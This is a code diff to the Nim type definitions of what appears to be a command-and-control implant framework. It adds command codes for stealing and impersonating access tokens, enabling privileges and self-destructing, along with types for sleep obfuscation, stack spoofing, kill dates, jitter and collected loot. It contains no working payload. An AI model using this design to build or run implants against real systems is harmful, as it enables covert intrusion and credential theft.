@@ -52,17 +52,14 @@ type
         CMD_SCREENSHOT = 15'u16
         CMD_DOTNET = 16'u16
         CMD_SLEEPMASK = 17'u16
-
-    ModuleType* = enum 
-        MODULE_ALL = 0'u32
-        MODULE_SLEEP = 1'u32
-        MODULE_SHELL = 2'u32 
-        MODULE_BOF = 4'u32
-        MODULE_DOTNET = 8'u32
-        MODULE_FILESYSTEM = 16'u32 
-        MODULE_FILETRANSFER = 32'u32
-        MODULE_SCREENSHOT = 64'u32
-        MODULE_SITUATIONAL_AWARENESS = 128'u32 
+        CMD_MAKE_TOKEN = 18'u16
+        CMD_STEAL_TOKEN = 19'u16 
+        CMD_REV2SELF = 20'u16 
+        CMD_TOKEN_INFO = 21'u16 
+        CMD_ENABLE_PRIV = 22'u16
+        CMD_DISABLE_PRIV = 23'u16
+        CMD_EXIT = 24'u16
+        CMD_SELF_DESTRUCT = 25'u16
 
     StatusType* = enum 
         STATUS_COMPLETED = 0'u8
@@ -100,16 +97,21 @@ type
         ZILEAN = 2'u8
         FOLIAGE = 3'u8
 
-# Custom iterator for ModuleType, as it uses powers of 2 instead of standard increments
-iterator items*(e: typedesc[ModuleType]): ModuleType =
-    yield MODULE_SLEEP
-    yield MODULE_SHELL
-    yield MODULE_BOF
-    yield MODULE_DOTNET
-    yield MODULE_FILESYSTEM
-    yield MODULE_FILETRANSFER
-    yield MODULE_SCREENSHOT
-    yield MODULE_SITUATIONAL_AWARENESS
+    ExitType* {.size: sizeof(uint8).} = enum 
+        EXIT_PROCESS = "process"
+        EXIT_THREAD = "thread"
+
+    ModuleType* = enum 
+        MODULE_ALL = 0'u32
+        MODULE_SLEEP = 1'u32
+        MODULE_SHELL = 2'u32 
+        MODULE_BOF = 4'u32
+        MODULE_DOTNET = 8'u32
+        MODULE_FILESYSTEM = 16'u32 
+        MODULE_FILETRANSFER = 32'u32
+        MODULE_SCREENSHOT = 64'u32
+        MODULE_SITUATIONAL_AWARENESS = 128'u32 
+        MODULE_TOKEN = 256'u32
 
 # Encryption 
 type    
@@ -128,7 +130,7 @@ type
         packetType*: uint8          # [1 byte  ] message type 
         flags*: uint16              # [2 bytes ] message flags
         size*: uint32               # [4 bytes ] size of the payload body
-        agentId*: Uuid              # [4 bytes ] agent id, used as AAD for encryptio
+        agentId*: Uuid              # [4 bytes ] agent id, used as AAD for encryption
         seqNr*: uint32              # [4 bytes ] sequence number, used as AAD for encryption
         iv*: Iv                     # [12 bytes] random IV for AES256 GCM encryption
         gmac*: AuthenticationTag    # [16 bytes] authentication tag for AES256 GCM encryption
@@ -178,9 +180,10 @@ type
         pid*: uint32
         isElevated*: uint8
         sleep*: uint32
+        jitter*: uint32
         modules*: uint32
 
-    AgentRegistrationData* = object
+    Registration* = object
         header*: Header
         agentPublicKey*: Key        # [32 bytes ] Public key of the connecting agent for key exchange
         metadata*: AgentMetadata
@@ -191,6 +194,7 @@ type
         agentId*: string
         listenerId*: string 
         username*: string 
+        impersonationToken*: string
         hostname*: string
         domain*: string
         ipInternal*: string
@@ -200,6 +204,7 @@ type
         pid*: int
         elevated*: bool 
         sleep*: int 
+        jitter*: int
         tasks*: seq[Task]
         modules*: uint32
         firstCheckin*: int64
@@ -211,6 +216,7 @@ type
         agentId*: string
         listenerId*: string 
         username*: string 
+        impersonationToken*: string
         hostname*: string
         domain*: string
         ipInternal*: string
@@ -220,6 +226,7 @@ type
         pid*: int
         elevated*: bool 
         sleep*: int 
+        jitter*: int
         modules*: uint32
         firstCheckin*: int64
         latestCheckin*: int64
@@ -229,15 +236,17 @@ type
     Protocol* {.size: sizeof(uint8).} = enum
         HTTP = "http"
 
-    Listener* = ref object of RootObj
+    Listener* = ref object
         server*: Server
         listenerId*: string
+        hosts*: string
         address*: string
         port*: int
         protocol*: Protocol
 
-    UIListener* = ref object of RootObj
+    UIListener* = ref object
         listenerId*: string
+        hosts*: string
         address*: string
         port*: int
         protocol*: Protocol
@@ -248,13 +257,16 @@ type
 type 
     EventType* = enum
         CLIENT_HEARTBEAT = 0'u8             # Basic checkin 
-        CLIENT_KEY_EXCHANGE = 200'u8
+        CLIENT_KEY_EXCHANGE = 200'u8        # Unencrypted public key sent by both parties for key exchange
 
         # Sent by client 
         CLIENT_AGENT_BUILD = 1'u8           # Generate an agent binary for a specific listener
         CLIENT_AGENT_TASK = 2'u8            # Instruct TS to send queue a command for a specific agent
         CLIENT_LISTENER_START = 3'u8        # Start a listener on the TS
         CLIENT_LISTENER_STOP = 4'u8         # Stop a listener
+        CLIENT_LOOT_REMOVE = 5'u8           # Remove loot on the team server
+        CLIENT_LOOT_GET = 6'u8              # Request file/screenshot from the team server for preview or download
+        CLIENT_AGENT_REMOVE = 7'u8          # Delete agent from the team server database
 
         # Sent by team server
         CLIENT_PROFILE = 100'u8             # Team server profile and configuration 
@@ -264,8 +276,11 @@ type
         CLIENT_AGENT_PAYLOAD = 104'u8       # Return agent payload binary 
         CLIENT_CONSOLE_ITEM = 105'u8        # Add entry to a agent's console 
         CLIENT_EVENTLOG_ITEM = 106'u8       # Add entry to the eventlog   
-        CLIENT_BUILDLOG_ITEM = 107'u8          # Add entry to the build log
-        CLIENT_LOOT = 108'u8                # Download file or screenshot to the operator desktop
+        CLIENT_BUILDLOG_ITEM = 107'u8       # Add entry to the build log
+        CLIENT_LOOT_ADD = 108'u8            # Add file or screenshot stored on the team server to preview on the client, only sends metadata and not the actual file content
+        CLIENT_LOOT_DATA = 109'u8           # Send file/screenshot bytes to the client to display as preview or to download to the client desktop
+        CLIENT_IMPERSONATE_TOKEN = 110'u8   # Access token impersonated
+        CLIENT_REVERT_TOKEN = 111'u8        # Revert to original logon session 
 
     Event* = object 
         eventType*: EventType               
@@ -296,17 +311,30 @@ type
         profile*: Profile
         client*: WsConnection
 
+    WorkingHours* = ref object 
+        enabled*: bool
+        startHour*: int32 
+        startMinute*: int32
+        endHour*: int32
+        endMinute*: int32
+
+    SleepSettings* = ref object 
+        sleepDelay*: uint32
+        jitter*: uint32
+        sleepTechnique*: SleepObfuscationTechnique
+        spoofStack*: bool
+        workingHours*: WorkingHours
+
     AgentCtx* = ref object
         agentId*: string
         listenerId*: string
-        ip*: string
-        port*: int
-        sleep*: int
-        sleepTechnique*: SleepObfuscationTechnique
-        spoofStack*: bool
+        hosts*: string
+        sleepSettings*: SleepSettings
+        killDate*: int64
         sessionKey*: Key
         agentPublicKey*: Key
         profile*: Profile
+        registered*: bool
         
 # Structure for command module definitions 
 type
@@ -335,15 +363,28 @@ type
 type 
     ConsoleItem* = ref object 
         itemType*: LogType
-        timestamp*: int64
+        timestamp*: string
         text*: string
 
     ConsoleItems* = ref object
         items*: seq[ConsoleItem]
 
     AgentBuildInformation* = ref object 
-        listenerId*: string 
-        sleepDelay*: uint32
-        sleepTechnique*: SleepObfuscationTechnique
-        spoofStack*: bool
+        listenerId*: string
+        sleepSettings*: SleepSettings
+        verbose*: bool
+        killDate*: int64
         modules*: uint32
+
+    LootItemType* = enum 
+        DOWNLOAD = 0'u8 
+        SCREENSHOT = 1'u8
+
+    LootItem* = ref object 
+        itemType*: LootItemType
+        lootId*: string
+        agentId*: string
+        host*: string 
+        path*: string 
+        timestamp*: int64
+        size*: int 
